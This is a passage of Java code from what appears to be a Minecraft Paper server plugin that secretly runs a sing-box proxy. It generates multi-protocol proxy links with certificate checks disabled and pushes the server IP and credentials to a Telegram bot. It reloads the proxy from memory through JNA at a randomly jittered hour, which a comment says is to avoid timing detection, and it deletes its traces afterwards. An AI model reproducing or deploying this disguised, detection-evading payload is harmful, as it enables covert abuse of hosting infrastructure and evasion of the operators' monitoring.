            String vmessJson = "{\"v\":\"2\",\"ps\":\"" + nodeName + "-VMess\",\"add\":\"" + host + "\",\"port\":\"" + vmessWsPort + "\",\"id\":\"" + uuid + "\",\"aid\":\"0\",\"scy\":\"auto\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"\",\"path\":\"/vmess\",\"tls\":\"tls\",\"sni\":\"" + sni + "\",\"alpn\":\"h2\",\"fp\":\"chrome\",\"allowInsecure\":1}";
            sb.append("vmess://").append(Base64.getEncoder().encodeToString(vmessJson.getBytes(StandardCharsets.UTF_8))).append("\n");
        }
        if (!vlessWsPort.isEmpty()) {
            sb.append("vless://").append(uuid).append("@").append(host).append(":").append(vlessWsPort);
            sb.append("?encryption=none&security=tls&sni=").append(sni).append("&type=ws&host=").append(sni).append("&path=/vless&fp=chrome&alpn=h2&allowInsecure=1").append("#").append(nodeName).append("-VLESS-WS\n");
        }
        if (!naivePort.isEmpty()) {
            sb.append("naive://").append(uuid.substring(0, 8)).append(":").append(uuid.substring(0, 12)).append("@").append(host).append(":").append(naivePort);
            sb.append("?sni=").append(sni).append("#").append(nodeName).append("-Naive\n");
        }
        if (!anytlsPort.isEmpty()) {
            sb.append("anytls://").append(uuid).append("@").append(host).append(":").append(anytlsPort);
            sb.append("?sni=").append(sni).append("&insecure=1").append("#").append(nodeName).append("-AnyTLS\n");
        }
        if (!tuicPort.isEmpty()) {
            sb.append("tuic://").append(uuid).append(":").append(uuid).append("@").append(host).append(":").append(tuicPort);
            sb.append("?sni=").append(sni).append("&alpn=h3&congestion_control=bbr&allowInsecure=1").append("#").append(nodeName).append("-TUIC\n");
        }
        // VMess 隧道节点（通过 Cloudflare 隧道）
        if (!argoUrl.isEmpty() && !argoUrl.contains("固定隧道")) {
            String node = buildVmessArgoLink(uuid, argoUrl, argoCfip, nodeName);
            sb.append(node).append("\n");
        }
        return sb.toString().trim();
    }

    private void sendTelegramMessage(String token, String chatId, String serverIP, String nodeName, String nodeText) {
        try {
            String b64 = java.util.Base64.getEncoder().encodeToString(nodeText.getBytes(StandardCharsets.UTF_8));
            String text = "✅ 节点已就绪 | " + nodeName + "\n" +
                    "🌍 IP: " + serverIP + "\n\n" +
                    "<pre>" + b64.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") + "</pre>";

            String json = "{\"chat_id\":" + (chatId.startsWith("@") ? "\"" + URLEncoder.encode(chatId, StandardCharsets.UTF_8) + "\"" : chatId)
                    + ",\"parse_mode\":\"HTML\"," +
                    "\"text\":\"" + text.replace("\n", "\\n").replace("\"", "\\\"") + "\"}";

            URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/json");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int code = conn.getResponseCode();
            if (code == 200) {
                getLogger().info("📨 Telegram 推送成功");
            } else {
                try (BufferedReader err = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {
                    getLogger().warning("⚠️ Telegram 推送失败，HTTP " + code + " — " + err.lines().collect(Collectors.joining()));
                }
            }
        } catch (Exception e) {
            getLogger().warning("⚠️ Telegram 推送异常: " + e.getMessage());
        }
    }

    // ===== 每日北京时间 00:03 重启 sing-box（每次新乱码名 + 重新生成配置）=====
    private void scheduleDailyRestart() {
        new BukkitRunnable() {
            @Override
            public void run() {
                ZoneId zone = ZoneId.of("Asia/Shanghai");
                LocalDateTime now = LocalDateTime.now(zone);
                // ponytail: 00:03~01:02 随机抖动，避免固定时间被时序检测
                LocalDateTime target = now.withHour(0).withMinute(0).withSecond(0).withNano(0)
                        .plusMinutes(3 + new Random().nextInt(60));
                if (!target.isAfter(now)) target = target.plusDays(1);
                long delay = Duration.between(now, target).toMillis();

                Bukkit.getScheduler().runTaskLater(PaperPlugin.this, () -> {
                    getLogger().info("[定时重启] 准备重启服务...");

                    if (stopSboxFn != null) {
                        try { stopSboxFn.invoke(new Object[]{}); } catch (Exception ignored) {}
                    }

                    try {
                        // 重新生成证书和配置（启动后已清理）
                        generateSelfSignedCert(cert, key);
                        String rp = "", rk = "";
                        if (Files.exists(REALITY_KEY_FILE)) {
                            for (String line : Files.readAllLines(REALITY_KEY_FILE)) {
                                if (line.startsWith("PrivateKey:")) rp = line.split(":", 2)[1].trim();
                                if (line.startsWith("PublicKey:")) rk = line.split(":", 2)[1].trim();
                            }
                        }
                        generateSingBoxConfig(configJson, uuid, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
                                sni, cert, key, rp, rk, argoEnabled, argoPort);
                        randomDelay();
                        // 复用已加载的 sbx.so（内存驻留），直接调用 StartSingBox
                        String payload = "{\"config\":\"" + configJson.toString().replace("\\", "/") + "\",\"workingDir\":\".\",\"disableColor\":true}";
                        new Thread(() -> {
                            try {
                                int code = startSboxFn.invokeInt(new Object[]{payload});
                                if (code != 0) getLogger().warning("重启后服务退出码: " + code);
                            } catch (Exception e) {
                                getLogger().warning("重启异常: " + e.getMessage());
                            }
                        }, "sbx-restart").start();
                        getLogger().info("服务重启成功（JNA 内存加载）");
                        scheduleDelayedCleanup();
                    } catch (Exception e) {
                        getLogger().severe("重启失败: " + e.getMessage());
                    }
                }, delay / 50); // 转换为 tick
            }
        }.runTaskTimerAsynchronously(this, 0L, 20L * 3600 * 24); // 每小时检查一次
    }

    private void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}